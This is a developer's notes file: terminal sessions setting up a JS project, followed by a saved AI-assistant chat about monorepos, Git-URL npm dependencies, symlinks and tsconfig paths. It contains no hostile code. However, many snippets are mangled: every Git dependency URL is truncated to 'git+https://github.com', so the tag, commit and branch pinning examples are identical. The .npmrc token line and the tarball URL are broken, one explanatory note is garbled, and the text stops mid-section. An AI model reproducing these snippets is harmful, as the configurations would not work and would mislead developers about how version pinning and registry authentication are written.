# .

```
 ~ % link
Create and check symlinks

Usage:
  link <source> <target>    Create symlink
  link <target>             Check symlink
  link [flag]               Check version or help

Options:
  -v, --version             Print version
  -h, --help                Print help
 ~ % link a b
 ~ % mkdir a
 ~ % touch a
```

```
 ~ % cd /home/fira/Documents/f/lib
 ...Documents/f/lib % git init
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint:
hint:   git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m <name>
Initialized empty Git repository in /home/fira/Documents/f/lib/.git/
 ...Documents/f/lib % git branch
 ...Documents/f/lib % git branch -m
fatal: branch name required
 ...Documents/f/lib % i
Wrote to /home/fira/Documents/f/lib/package.json

{
  "packageManager": "pnpm@10.30.2"
}
 ...Documents/f/lib % b i
bun install v1.3.14 (0d9b296a)
Resolving dependencies
Resolved, downloaded and extracted [131]
Saved lockfile

+ @floating-ui/react@0.27.20
+ @folder/xdg@4.0.1
+ clsx@2.1.1
+ css.escape@1.5.1
+ fuzzysort@4.0.2
+ lodash-es@4.18.1
+ mousetrap@1.6.5
+ mousetrap-global-bind@1.1.0
+ react@19.2.7
+ react-dom@19.2.7
+ react-use@17.6.1
+ style-to-js@2.0.2
+ tabbable@6.5.0
+ the-new-css-reset@1.11.3
+ trash@10.1.1
+ yaml@2.9.0 (v2.9.1 available)

126 packages installed [2.09s]
 ...Documents/f/lib % b i
bun install v1.3.14 (0d9b296a)
Resolving dependencies
Resolved, downloaded and extracted [103]

+ @eslint/js@10.0.1
+ @types/node@25.6.0
+ @typescript-eslint/eslint-plugin@8.60.0
+ @typescript-eslint/parser@8.60.0
+ @typescript-eslint/rule-tester@8.62.0
+ @typescript-eslint/utils@8.62.0
+ @typescript/native-preview@7.0.0-dev.20260515.1
+ eslint@10.3.0
+ process@0.11.10
+ tsx@4.21.0
+ typescript@6.0.3
+ typescript-eslint@8.59.3

109 packages installed [1.77s]
Saved lockfile
```

```
 ~ % cd /home/fira/Documents/f/apps/tools/source
 ...apps/tools/source % link lib ../../../lib
 ...apps/tools/source % link ../../../lib lib
 ...apps/tools/source % touch test.ts
 ...apps/tools/source % open test.ts
```

# how to create a js monorepo

## how to create a js monorepo

7:41 PM

To create a JavaScript monorepo, the most standard and efficient method is <mark>using<span> </span><strong>native Package Manager Workspaces</strong><span> </span>(supported by npm, yarn, and pnpm) paired with a build orchestrator like<span> </span><strong><span>Turborepo</span></strong></mark>. [link](https://www.youtube.com/watch?v=BSrd%5FrU0Ioo)

Here is a step-by-step guide to setting up a modern JavaScript monorepo from scratch using **npm** and **Turborepo**. [link](https://dev.to/rajeshnatarajan/how-to-build-a-monorepo-with-nextjs-3ljg)

***

### Step 1: Initialize the Root Project

Create a new directory for your monorepo and initialize it as a private package so it isn't accidentally published to npm. [link](https://tsev.dev/posts/2023-08-27-setting-up-a-modern-monorepo/)

bash

```
mkdir my-js-monorepo && cd my-js-monorepo
npm init -y
```

Use code with caution.

Open the root `package.json` and make sure it has the following properties, including the `workspaces` array that defines where your apps and shared code will live: [link](https://medium.com/@pporche87/hello-world-building-a-js-monorepo-with-next-js-and-react-native-37336901a5fc)

json

```
{
  "name": "my-js-monorepo",
  "version": "1.0.0",
  "private": true,
  "workspaces": [
    "apps/*",
    "packages/*"
  ]
}
```

Use code with caution.

### Step 2: Create the Folder Structure

Create the folders corresponding to your workspaces. The `apps/` directory is generally used for deployable applications (like websites or APIs), while `packages/` holds reusable utilities, UI components, or configurations. [link](https://www.robinwieruch.de/javascript-monorepos/)

bash

```
mkdir apps packages
```

Use code with caution.

### Step 3: Create an Internal Shared Package

Let’s create a reusable helper package inside `packages/` that other applications can import. [link](https://www.youtube.com/watch?v=TeOSuGRHq7k)

bash

```
mkdir packages/utils && cd packages/utils
npm init -y
```

Use code with caution.

Modify `packages/utils/package.json` to name the package uniquely (usually scoped with your project name): [link](https://medium.com/@bashorundolapo/how-to-create-a-simple-next-js-monorepo-with-pnpm-82af37289b50)

json

```
{
  "name": "@repo/utils",
  "version": "1.0.0",
  "main": "index.js"
}
```

Use code with caution.

Create an `index.js` file in `packages/utils/` and add a simple function:

javascript

```
// packages/utils/index.js
export function greet(name) {
  return `Hello, ${name}! Powered by the monorepo.`;
}
```

Use code with caution.

### Step 4: Create an Application

Navigate back to the root, then set up an app inside the `apps/` folder. For simplicity, we'll make a quick Node.js app. [link](https://javascript.plainenglish.io/building-a-full-stack-monorepo-with-typescript-a-guide-for-scalable-development-4629537efb25)

bash

```
cd ../../
mkdir apps/web-app && cd apps/web-app
npm init -y
```

Use code with caution.

Change the name in `apps/web-app/package.json` to `@repo/web-app`. Now, link your shared `@repo/utils` package as a dependency: [link](https://www.linkedin.com/pulse/how-build-monorepo-7-easy-steps-even-youve-never-done-nicola-riker-je26c)

json

```
{
  "name": "@repo/web-app",
  "version": "1.0.0",
  "main": "index.js",
  "type": "module",
  "dependencies": {
    "@repo/utils": "*"
  }
}
```

Use code with caution.

\_(Note: The `"_"` tells the package manager to resolve the dependency locally from your workspaces rather than looking on npm).\* [link](https://www.robinwieruch.de/javascript-monorepos/)

Create an `index.js` in `apps/web-app/` to use the shared package:

javascript

```
// apps/web-app/index.js
import { greet } from '@repo/utils';

console.log(greet('Developer'));
```

Use code with caution.

### Step 5: Install and Link Everything

Go back to the root of your monorepo and run `npm install`. Npm will automatically analyze your workspaces and link `@repo/utils` directly into `@repo/web-app`'s `node_modules`. [link](https://www.freecodecamp.org/news/how-to-build-a-scalable-design-system-in-a-monorepo/)

bash

```
cd ../../
npm install
```

Use code with caution.

You can now test running your application from the root using npm's workspace flag: [link](https://www.linkedin.com/pulse/how-build-monorepo-7-easy-steps-even-youve-never-done-nicola-riker-je26c)

bash

```
npm run start --workspace=@repo/web-app
```

Use code with caution.

***

### Step 6: Supercharge Tasks with Turborepo

As your monorepo grows, running tests, lints, and builds across dozens of apps gets incredibly slow. **Turborepo** caches your build tasks and runs them in parallel. [link](https://www.youtube.com/watch?v=C-hEgl%5FF6lE)

1. Install `turbo` as a development dependency at the root:\
   bash

<!---->

```
npm install turbo --save-dev
```

Use code with caution.
2\. Create a `turbo.json` file in your root directory to orchestrate your scripts:\
json

```
{
  "$schema": "https://turbo.build",
  "tasks": {
    "build": {
      "dependsOn": ["^build"],
      "outputs": ["dist/**"]
    },
    "dev": {
      "cache": false,
      "persistent": true
    }
  }
}
```

Use code with caution.
3\. Add global scripts to your root `package.json` to leverage turbo: [link](https://www.youtube.com/watch?v=C-hEgl%5FF6lE)\
json

```
"scripts": {
  "build": "turbo build",
  "dev": "turbo dev"
}
```

Use code with caution.

Now, running `npm run build` or `npm run dev` at the root will execute that script across every workspace simultaneously with ultra-fast caching mechanisms. [link](https://www.youtube.com/watch?v=C-hEgl%5FF6lE)

To understand how these layers connect and how a package graph behaves, you can watch this structural overview:

11:58

[link](https://www.youtube.com/watch?v=TeOSuGRHq7k)

How to structure a JS/TS monorepo | From Zero to Turbo - Part 1

101K views · 2 years ago

YouTube · Anthony Shew

To better tailor this setup, let me know:

- Will you be using **TypeScript** or standard **JavaScript**?

- What **frameworks** are you planning to use for your apps (e.g., Next.js, Express, React Native)?

- Do you have a preferred package manager (**npm, pnpm, or yarn**)?

- [link](https://www.reddit.com/r/node/comments/12vj0el/what%5Fare%5Fthe%5Fbest%5Fways%5Fto%5Flearn%5Fhow%5Fto%5Fsetup%5Fa/)\
  Reddit\
  What are the best ways to learn how to setup a Monorepo?\
  You can create a yarn monorepo with workspaces without a TON of setup. It's the easiest way to do it yourself that I've found- eas...

- [link](https://www.youtube.com/watch?v=TeOSuGRHq7k)\
  YouTube·Anthony Shew\
  How to structure a JS/TS monorepo | From Zero to Turbo - Part 1\
  and you can make all your builds lints tests. and other tasks. super fast with Turbo Repo. and honestly it might not be as hard as...\
  11:58

- [link](https://tsev.dev/posts/2023-08-27-setting-up-a-modern-monorepo/)\
  Tim Severien\
  Setting up a modern JavaScript monorepo - Tim Severien\
  A monorepo is a repository that contains multiple applications, packages, or modules. Keeping these together in a single repositor...

Show all

## how to create an archi where they can dl one project and all deps wo cloning the whole repo of all projects when all project share a few centralized deps

how to create an archi where they can dl one project and all deps wo cloning the whole repo of all projects when all project share a few centralized deps

7:43 PM

To solve this without forcing developers to clone a massive monorepo just to work on a single project, you need an architecture that **separates the source code location from the package consumption**.

The industry-standard pattern for this is a **Poly-Repo Architecture with a Private Package Registry** combined with **Automated Version Releases**.

***

### The Architecture Workflow

Instead of keeping everything in one Git repository, you split your projects into their own isolated repositories. The shared dependencies live in their own dedicated repository (or individual repositories) and are consumed like standard third-party npm packages.

```
[ Reusable Shared Dep Repos ]
   │
   ▼ (Automated CI Release)
[ Private Package Registry ] (npm Enterprise, GitHub Packages, AWS CodeArtifact)
   │
   ├──► [ App Project A Repo ] (Clones instantly, downloads only Shared Deps via npm install)
   ├──► [ App Project B Repo ] (Clones instantly)
   └──► [ App Project C Repo ] (Clones instantly)
```

***

### Step-by-Step Implementation Guide

#### Step 1: Isolate the Centralized Dependencies

Create standalone Git repositories for your shared dependencies (e.g., `@my-org/shared-ui`, `@my-org/api-client`, `@my-org/utils`).

In their `package.json`, specify their scope and names:

json

```
{
  "name": "@my-org/shared-ui",
  "version": "1.0.0",
  "main": "dist/index.js"
}
```

Use code with caution.

#### Step 2: Set Up a Private Package Registry

To prevent your proprietary code from being publicly available, host your shared dependencies on a private registry. The most seamless options include:

- **[GitHub Packages](https://github.com/features/packages)** (Highly recommended if your code is already on GitHub)
- **[npm Enterprise / Private Packages](https://www.npmjs.com/)**
- **[AWS CodeArtifact](https://aws.amazon.com/codeartifact/)** or **Azure Artifacts**

#### Step 3: Automate Publishing with CI/CD

To avoid making publishing shared packages a manual chore, set up a tool like **[Changesets](https://github.com/changesets/changesets)** or **Semantic Release** paired with GitHub Actions or GitLab CI.

Every time a developer merges a change into the shared dependency repository, the CI/CD pipeline automatically:

1. Increments the version (e.g., `1.0.0` → `1.0.1`).
2. Builds the project.
3. Publishes the artifact to your private registry via `npm publish`.

#### Step 4: Configure App Repositories to Pull Dependencies

Now, when a developer wants to work on _Project A_, they **only clone Project A's Git repository**.

1. They add an `.npmrc` file to the root of Project A to point your organization's scope (`@my-org`) to your private registry:\
   ini

<!---->

```
# .npmrc
@my-org:registry=https://github.com
//://github.com{NODE_AUTH_TOKEN}
```

Use code with caution.
2\. They add the shared dependency to Project A's `package.json`:\
json

```
"dependencies": {
  "@my-org/shared-ui": "^1.0.0"
}
```

Use code with caution.
3\. The developer runs `npm install`. The package manager downloads only the compiled `shared-ui` package straight from the registry, without cloning any other application repositories.

***

### Alternative: Git Submodules (If you absolutely cannot use a Registry)

If setting up an artifact registry is blocked by your organization, you can use **[Git Submodules](https://git-scm.com/book/en/v2/Git-Tools-Submodules)**.

You keep your centralized dependencies in a separate repository, and embed them inside individual project repositories. When a developer clones Project A, they run:

bash

```
git clone --recurse-submodules <project-a-url>
```

Use code with caution.

This pulls down _only_ Project A and the specific shared dependency repository, entirely bypassing Projects B, C, and D. However, managing Git submodules requires strict version pinning and can introduce friction during updates compared to standard package managers.

AI-generated. Don't enter sensitive personal info.

To help narrow down the best toolchain for this, tell me:

- Where is your source code currently hosted (**GitHub, GitLab, Bitbucket**)?
- Do your individual projects need to **frequently modify** the centralized dependencies during day-to-day feature work, or are the shared dependencies relatively **stable**?
- Are you looking for a completely **free/open-source self-hosted** path, or are **managed cloud services** acceptable?

## how to go the simple way

how to go the simple way

7:46 PM

The absolute simplest way to achieve this without setting up private package registries, CI/CD pipelines, or complex Git submodules is to install your shared dependencies **directly from their private Git URLs**.

Npm, pnpm, and yarn all natively support installing packages directly from Git hosts like GitHub, GitLab, or Bitbucket.

***

### The Simple Architecture Structure

You split your projects into separate Git repositories. When a developer installs dependencies for App A, the package manager reaches out to your Git host, grabs only the shared repository, and puts it in `node_modules`.

```
[ Git Host: GitHub / GitLab ]
   ├──► Shared Repository (Contains your centralized utils/components)
   │
   └──► App A Repository ──► (Runs 'npm install' ──► Downloads Shared Repo directly)
```

***

### Step-by-Step Implementation

#### Step 1: Set Up Your Shared Repository

Create a repository for your shared code. The only requirement is that it must have a valid `package.json` at its root.

json

```
{
  "name": "@my-org/shared-deps",
  "version": "1.0.0",
  "main": "index.js"
}
```

Use code with caution.

_Note: If your shared project requires a build step (like TypeScript to JavaScript compilation), make sure you commit the compiled files (e.g., a `dist/` or `build/` folder) to this Git repo so the apps can read it directly._

#### Step 2: Install Directly in Your App Repositories

When a developer clones **App A**, they don't touch any other application repos. To pull in the shared dependency, they open App A's `package.json` and add the Git URL format under `dependencies`:

json

```
{
  "name": "app-a",
  "version": "1.0.0",
  "dependencies": {
    "@my-org/shared-deps": "git+https://github.com"
  }
}
```

Use code with caution.

#### Step 3: Run `npm install`

When the developer runs `npm install`, the package manager uses their existing local Git credentials (SSH keys or HTTPS tokens) to authenticate, clone _only_ that shared dependency repository, and inject it straight into `node_modules`.

***

### How to Lock Versions Dynamically

Because you aren't using a registry to handle version numbers like `1.2.3`, you can lock your shared dependencies to specific Git branches, tags, or commit hashes directly in the URL using the `#` symbol:

- **Lock to a specific Git Tag (Recommended for production):**\
  `"git+https://github.com"`
- **Lock to a specific Commit Hash:**\
  `"git+https://github.com"`
- **Target a development Branch:**\
  `"git+https://github.com"`

***

### The Trade-offs of the Simple Way

While this bypasses hours of architectural setup, keep two things in mind:

1. **No Automatic Build on Install:** Npm will not run compilation steps for the dependency upon installation. You must check your compiled/bundled code into the shared Git repo.
2. **Slower Installs:** Running `npm install` takes slightly longer because the package manager has to perform a `git clone` under the hood rather than downloading a highly optimized, compressed `.tgz` file from a package registry.

To ensure this works smoothly for your team, let me know:

- Do your shared dependencies need a **build/compilation step** (like TypeScript or Babel), or are they **plain JavaScript**?
- Does your team authenticate with your Git host primarily via **HTTPS** or **SSH** keys?

## why slower install

why slower install

7:54 PM

When you install a standard dependency from a package registry (like public npm), your package manager downloads a highly compressed, single archive file (a `.tgz` tarball) containing only the exact runtime files.

When you use the **"Simple Git Way,"** the package manager has to perform a full `git clone` command behind the scenes. This creates significant overhead for three main reasons:

### 1. Downloading the Entire History

A registry tarball only contains the _current_ files. A Git clone downloads **every single change, commit, commit message, and author history** that has ever occurred in that shared repository since day one. If your shared repo has hundreds of commits or deleted assets, your package manager is downloading all of that dead weight into `node_modules`.

### 2. Network Handshakes & Authentication

Downloading a tarball from a registry is a straightforward HTTPS request. A Git install requires the package manager to open an SSH or HTTPS connection to GitHub/GitLab, authenticate your machine, check your repository permissions, resolve branches, and check out the correct commit hash. This handshaking process adds noticeable latency.

### 3. Missing Modern Package Optimization

Modern package managers (like `pnpm`, `yarn berry`, or `npm` v9+) use aggressive, lightning-fast caching strategies. They keep global stores of registry tarballs on your computer so that if two apps use the same package, it takes milliseconds to link them. Git dependencies bypass many of these optimization layers, forcing the package manager to re-fetch or re-evaluate the Git repository more frequently.

***

### 💡 A Simple Fix to Speed It Up

If you want to keep using this simple Git approach but want to fix the speed issue, you can force the package manager to download _only_ the latest snapshot of the files without the full historical commit log.

You can do this by using a **GitHub Tarball URL** directly in your `package.json` instead of the standard `.git` link:

json

```
"dependencies": {
  "@my-org/shared-deps": "https://github.com"
}
```

Use code with caution.

_(Replace `main` with a tag like `v1.0.0` or a commit hash to pin versions)._

By changing this, GitHub wraps your shared code into a compressed archive on the fly. Your package manager downloads it instantly like a regular npm package, giving you the best of both worlds: no registries to maintain, and lightning-fast installs.

Would you like help formatting the **GitHub Tarball URL with token authentication** so it securely works for your developers on their local machines?

## how to symlink and import a local folder if i handle it in my way

how to symlink and import a local folder if i handle it in my way

7:55 PM

If you want to handle cloning, versioning, and folder management completely your own way, you can connect your application to your local shared folder using **npm symlinks**.

This bypasses registries and remote Git downloads entirely. Your package manager points directly to the folder on your hard drive, updating in real-time as you make changes.

***

### Step 1: Link the Shared Folder to your Global Store

First, tell your package manager to register your shared dependency folder locally.

Navigate to your shared folder on your computer and run `npm link`:

bash

```
cd /path/to/your/shared-deps
npm link
```

Use code with caution.

_What this does:_ It creates a global symlink (a shortcut) on your machine pointing directly to this exact folder.

### Step 2: Connect the Application to the Global Link

Next, navigate to your application's directory and tell it to pull in that global link:

bash

```
cd /path/to/your/app-a
npm link @my-org/shared-deps
```

Use code with caution.

_(Replace `@my-org/shared-deps` with the exact `"name"` string specified inside your shared folder's `package.json`)._

_What this does:_ It injects a virtual link inside your app's `node_modules` folder that routes directly to your local shared code folder.

### Step 3: Import it into your Code

You can now import it in your application code exactly as if it were a normal package downloaded from npm:

javascript

```
// app-a/index.js
import { mySharedFunction } from '@my-org/shared-deps';

mySharedFunction();
```

Use code with caution.

***

### The `npm install` Warning ⚠️

When you run a standard `npm install` inside your application to add _other_ packages (like `lodash` or `express`), **npm will automatically wipe out your manual symlinks**.

To prevent having to re-run `npm link` constantly, you can explicitly hardcode the relative local file path directly into your application's `package.json`:

json

```
{
  "name": "app-a",
  "version": "1.0.0",
  "dependencies": {
    "@my-org/shared-deps": "file:../path/to/shared-deps"
  }
}
```

Use code with caution.

When a developer runs `npm install` with a `file:` protocol, npm automatically handles the symlinking process under the hood safely and persistently.

To ensure this fits your workflow perfectly, let me know:

- Will your developers always clone both folders into the **same relative path** on their machines (e.g., side-by-side in a `projects/` directory)?
- Do you plan to script this process using a **shell script or Makefile** to automate it for new onboarding developers?

## can i symlink direclty wo telling npm

can i symlink direclty wo telling npm

7:56 PM

<mark><span>Yes, you can<span> </span></span><strong>symlink directly without npm</strong></mark>, but there is one major catch with how Node.js resolves imports.

To make it work, you can create OS-level symlinks using your terminal, but you must pass a specific flag to Node.js when running your application.

***

### Step 1: Create the Manual Symlink

Instead of asking npm to do it, create a direct symlink inside your application's `node_modules` folder pointing to your shared directory using your operating system's native command:

**On macOS / Linux:**

bash

```
ln -s /absolute/path/to/shared-deps /absolute/path/to/app-a/node_modules/@my-org/shared-deps
```

Use code with caution.

**On Windows (CMD as Administrator):**

cmd

```
mklink /D "C:\path\to\app-a\node_modules\@my-org\shared-deps" "C:\path\to\shared-deps"
```

Use code with caution.

### Step 2: Import It Normally

Once that link is created in `node_modules`, your IDE will recognize it, and you can write your imports exactly like a standard package:

javascript

```
import { mySharedFunction } from '@my-org/shared-deps';
```

Use code with caution.

***

### The Big Catch: Node's Module Resolution ⚠️

By default, when Node.js encounters a symlink, it instantly resolves it to its **real, physical location** on your hard drive.

If your shared folder has its own `node_modules` (like dependencies or peer dependencies), Node.js will try to look for them relative to the _shared_ folder's path, not your _app's_ path. This frequently causes **"Module not found"** errors or duplicate instance bugs (e.g., two versions of React running simultaneously).

### The Fix: Use the `--preserve-symlinks` Flag

To bypass this behavior and force Node.js to treat the symlink as if it were a real folder inside your app's `node_modules`, you **must** run your application with the `--preserve-symlinks` flag:

bash

```
node --preserve-symlinks index.js
```

Use code with caution.

If you are running your app via a framework or tool (like Vite, Webpack, or Next.js), you will need to turn on symlink preservation in their respective config files instead:

- **Vite:** Set `resolve.preserveSymlinks: true` in `vite.config.js`.
- **Webpack:** Set `resolve.symlinks = false` in `webpack.config.js`.

***

### The Operational Downside

While this completely bypasses npm, remember that **running `npm install` or `npm prune` in your app will still delete this folder link**, because npm aggressively manages and cleans everything inside the `node_modules` directory. You will have to re-run your OS `ln -s` command every time you install new third-party packages.

Would you like a short **Bash or Batch script** that automates creating these OS links and running your app with the correct flag for your team? Let me know if you are on **macOS/Linux** or **Windows**.

## what if i symlink directly and rely on tsconfig instead of npm

what if i symlink directly and rely on tsconfig instead of npm

7:57 PM

Using **`tsconfig.json` path mapping** is the ultimate developer experience (DX) shortcut for this workflow. By doing this, you do not need to create physical OS symlinks, you do not need to touch `node_modules`, and you don't have to worry about `npm install` wiping your links out.

TypeScript will handle the virtual linking entirely at compile time.

***

### Step 1: Configure `tsconfig.json` in Your App

In your application's root directory, open your `tsconfig.json` and add `baseUrl` and `paths`. This maps your import string directly to the physical location of your shared folder:

json

```
{
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@my-org/shared-deps": ["../path/to/shared-deps/src/index.ts"]
    }
  }
}
```

Use code with caution.

_Note: Ensure the path points directly to the entry file (like `index.ts`) of your shared source code._

### Step 2: Import Code Seamlessly

Your IDE (like VS Code) will immediately recognize this mapping. You get instant auto-complete, go-to-definition, and type checking across repositories:

typescript

```
// app-a/src/main.ts
import { mySharedFunction } from '@my-org/shared-deps';
```

Use code with caution.

***

### The Big Catch: Runtime Execution ⚠️

While TypeScript now perfectly understands your imports, **Node.js/the browser does not**. TypeScript does not alter import strings during compilation; it leaves `@my-org/shared-deps` exactly as written. If you try to run the compiled JavaScript file via standard Node, it will throw a `Cannot find module` error.

To execute this setup at runtime, you must use a tool that translates those `tsconfig` paths into real paths on the fly.

#### Option A: Running with Node.js / Ts-Node

If you are running a backend Node app, use the **`tsconfig-paths`** package to resolve the paths dynamically:

bash

```
# Install the runner
npm install --save-dev tsconfig-paths

# Run your app passing it as a require hook
node -r tsconfig-paths/register dist/main.js
# Or during development with ts-node:
ts-node -r tsconfig-paths/register src/main.ts
```

Use code with caution.

#### Option B: Bundlers & Modern Frameworks (Vite, Next.js, Webpack)

If you are building a frontend application, modern bundlers can read `tsconfig.json` paths automatically or with a tiny plugin:

- **Vite:** Install and add **`vite-tsconfig-paths`** to your `vite.config.ts`. It will resolve everything natively for both development and production bundles.
- **Next.js:** Supports `tsconfig.json` paths out of the box with zero configuration required.
- **Webpack:** Use the `tsconfig-paths-webpack-plugin`.

***

### Why this is better than OS Symlinks

1. **Zero OS dependencies:** It works identically for developers on Windows, macOS, and Linux without worrying about administrative terminal access (which Windows requires for `mklink`).
2. **Immutable `node_modules`:** Running `npm install`, `npm clean`, or switching branches in your application will never break or delete this relationship.

To ensure your runtime compilation works seamlessly, let me know:

- What **tool or bundler** are you using to run/build your app (e.g., **Vite, Next.js, ts-node, or native tsc**)?
- Will your developers always store the application and shared dependency folders in the **same parent directory** so the relative paths match (`../path/to/shared`)?

## do symlinks persist after build

do symlinks persist after build

7:58 PM

<mark><strong><span>No, symlinks do not persist after a build.</span></strong></mark>

When you run a build step (using a bundler like **Vite**, **esbuild**, or **Webpack**), the build engine resolves all symlinks, grabs the actual code from the source files, and packs everything into a standalone, self-contained output directory (usually named `dist/` or `build/`).

How this plays out depends entirely on your setup:

### 1. Frontend / Bundled Apps (Vite, Next.js, Webpack)

If you are compiling code for a website or browser application:

- **What happens:** The bundler follows your symlink or `tsconfig` path, extracts the exact functions you imported, and blends them directly into your final product's unified production JavaScript bundles.
- **The Result:** The output folder is completely self-contained. You can ship it to a server or CDN **without** moving your shared dependencies folder along with it. The symlink is completely gone, replaced by raw production code.

### 2. Backend Apps / Pure TypeScript Compilation (`tsc`)

If you are compiling server-side code using the native TypeScript compiler (`tsc`) without a bundler:

- **What happens:** TypeScript strips away your type definitions and outputs clean JavaScript files, but it **keeps your import statements exactly as they were written** (e.g., `require("@my-org/shared-deps")` or `import "@my-org/shared-deps"`).
- **The Result:** The symlink itself is not copied into your `dist/` output folder. If you try to run `node dist/index.js` on a server, it will crash with a `Cannot find module` error unless you manually re-create the symlink inside that new production `dist/node_modules/` folder or bundle the server code using a tool like esbuild.

***

### Summary Checklist for Production Deployment

To move your app to production using your custom workflow, follow these rules:

- **If it's a frontend web app:** Just build it. Your shared code is safely embedded inside the compiled output files.
- **If it's a backend Node app:** You must bundle your backend code into a single file during production deployment using a compiler like **esbuild**, which resolves and flattens symlinks out of existence just like a frontend bundler.

Are you compiling a **frontend app** (which automatically merges code into bundles) or a **backend Node.js app** (which relies on modules remaining separate at runtime)? I can help you select the exact production build command to prevent deployment crashes.

## how can i name it in packagejson

how can i name it in packagejson

8:10 PM

To name and set up your shared package so that it works seamlessly with your custom `tsconfig.json` path strategy, you should configure the `package.json` inside **both** folders carefully.

Here is exactly how to name and structure them.

***

### 1. In the Shared Dependency Folder

Inside your shared dependency's `package.json`, name it using an **npm scope** (e.g., `@my-org/`). This makes it obvious in your application code that it is an internal corporate package, preventing name collisions with public packages on npm.

json

```
{
  "name": "@my-org/shared-deps",
  "version": "1.0.0",
  "private": true,
  "main": "./src/index.ts",
  "types": "./src/index.ts"
}
```

Use code with caution.

- **`name`**: This string must match the exact key name you plan to target in your application's config files.
- **`private: true`**: Prevents developers from accidentally running `npm publish` and pushing your proprietary code to the public npm registry.

***

### 2. In the Main Application Folder

Inside your main application's `package.json`, you **do not** add the shared package to your standard `"dependencies"` object.

Because you are using `tsconfig.json` paths to virtually map the folders, adding it to `package.json` dependencies would confuse npm and cause it to look for it on the internet or fail during an `npm install`.

Instead, just name your application normally:

json

```
{
  "name": "my-main-app",
  "version": "1.0.0",
  "private": true,
  "dependencies": {
    "lodash": "^4.17.21"
  }
}
```

Use code with caution.

_(Notice that `@my-org/shared-deps` is completely absent from this file. Its connection is handled entirely by your development configs)._

***

### 3. Connecting the Dots via `tsconfig.json`

To make sure TypeScript bridges the name you chose in the shared folder to the application, your application's `tsconfig.json` maps that name to the physical folder file path:

json

```
{
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "@my-org/shared-deps": ["../shared-deps/src/index.ts"]
    }
  }
}
```

Use code with caution.

Now, inside your application code, you can import it beautifully by its `package.json` name:

typescript

```
import { mySharedFunction } from '@my-org/shared-deps';
```

Use code with caution.

To ensure your code compiles smoothly without any hidden path bugs, let me know:

- What is the **exact folder structure** or relative directory layout of these two folders on your machine?
- Are you planning to use a **frontend framework** like Next.js or Vite to build the app?

## can i name it wo namespace prefix

can i name it wo namespace prefix

8:11 PM

Yes, **you can name it absolutely anything you want**, without any namespace or `@` prefix.

Inside your shared directory’s `package.json`, you can give it a plain name:

json

```
{
  "name": "my-shared-utils",
  "version": "1.0.0",
  "private": true
}
```

Use code with caution.

***

### How to map a prefix-free name in `tsconfig.json`

To make this work with your `tsconfig.json` path strategy, you map the exact prefix-free name directly to your local file path:

json

```
{
  "compilerOptions": {
    "baseUrl": ".",
    "paths": {
      "my-shared-utils": ["../shared-deps/src/index.ts"]
    }
  }
}
```

Use code with caution.

You can then import it natively in your source files like this:

typescript

```
import { mySharedFunction } from 'my-shared-utils';
```

Use code with caution.

***

### ⚠️ Two Important Warnings for Prefix-Free Names

While this works perfectly, keeping the namespace prefix off can lead to two issues as your project grows:

#### 1. Avoid Naming Collisions with Real Public Packages

If you name your local folder something generic like `utils`, `config`, or `components`, and a developer later runs `npm install utils` to fetch a public third-party library, **Node.js/npm will break**.

Because your custom bundler or `tsconfig` maps `utils` locally, it will override the real npm package, preventing your app from accessing the third-party library. Using a unique name like `company-utils` or a namespace prefix avoids this entirely.

#### 2. Visual Confusion in Imports

When looking at file imports, developers universally recognize a namespace prefix (like `@my-org/`) as an internal project dependency, and relative paths (like `../../components`) as local files.

If you import from a flat string like `'my-shared-utils'`, another developer joining your team might assume it is an open-source library downloaded from the public internet via npm, making the architecture harder to audit visually.

If you want to move forward with this approach, let me know:

- What **exact name** are you planning to give your shared project?
- What **bundler or framework** (e.g., Vite, Next.js, ts-node) are you running the application with so we can verify the path resolution works seamlessly?

## i mean to use the npm plus git approach wo tsconfig tricks

i mean to use the npm plus git approach wo tsconfig tricks

8:13 PM

Yes, you can absolutely name it **without a namespace prefix** using the npm plus Git approach.

Inside your shared directory’s `package.json`, give it any plain name you want:

json

```
{
  "name": "my-shared-utils",
  "version": "1.0.0",
  "private": true,
  "main": "index.js"
}
```

Use code with caution.

***

### How to install it in your Application

Because you are using the native Git approach, you must add it to your main application's `package.json` dependencies manually. You simply pair your prefix-free name with your Git repository URL:

json

```
{
  "name": "my-main-app",
  "version": "1.0.0",
  "dependencies": {
    "my-shared-utils": "git+https://github.com"
  }
}
```

Use code with caution.

When developers run `npm install`, npm will fetch that repository and put it into `node_modules/my-shared-utils`.

***

### How to Import It

Because npm natively handles putting the folder into `node_modules` under that exact name, you do not need any `tsconfig.json` path tricks. You import it completely clean:

javascript

```
import { mySharedFunction } from 'my-shared-utils';
```

Use code with caution.

***

### One Crucial Warning ⚠️

If you use a plain name like `my-shared-utils`, **ensure that name is not already taken by a public package on the public npm registry**.

If someone else has published a public package named `my-shared-utils`, npm can get confused during certain dependency resolution updates (like `npm audit fix` or when tracking nested peer dependencies), occasionally trying to fetch the public registry version instead of your Git version.

To completely safe-proof this:

1. Make sure your custom name is highly unique (e.g., `companyname-shared-utils`).
2. Search [npmjs.com](https://www.npmjs.com/) first to verify nobody else has claimed that exact name.

To make sure your Git URLs are perfectly formatted for your team, let me know:

- Is your shared Git repository hosted on **GitHub, GitLab, or a self-hosted server**?
- Does your team authenticate with your Git host using **SSH keys** (`git@...`) or **HTTPS/Personal Access Tokens**?

## what if i dont care what others do

what if i dont care what others do

8:13 PM

If you don't care about namespace conventions or potential public name clashes, **you can name it absolutely whatever you want.** Npm will strictly respect your Git URL directive.

Here is the raw, no-nonsense setup to make it work.

### 1. The Shared Project `package.json`

Give it your chosen name. For this example, let's call it `super-utils`:

json

```
{
  "name": "super-utils",
  "version": "1.0.0",
  "private": true,
  "main": "index.js"
}
```

Use code with caution.

### 2. The App Project `package.json`

Directly force npm to map that exact name to your specific Git repository URL:

json

```
{
  "name": "my-app",
  "version": "1.0.0",
  "dependencies": {
    "super-utils": "git+https://github.com"
  }
}
```

Use code with caution.

### How Npm Natively Handles It

When you or anyone else runs `npm install`, npm bypasses the public registry lookup for that package. It looks at the URL, authenticates via Git, downloads the repository, and creates a folder named exactly `super-utils` inside your `node_modules` directory.

Because it is sitting directly inside `node_modules/super-utils`, your runtime and compiler will resolve it automatically without any configuration tweaks.

### How to Import It

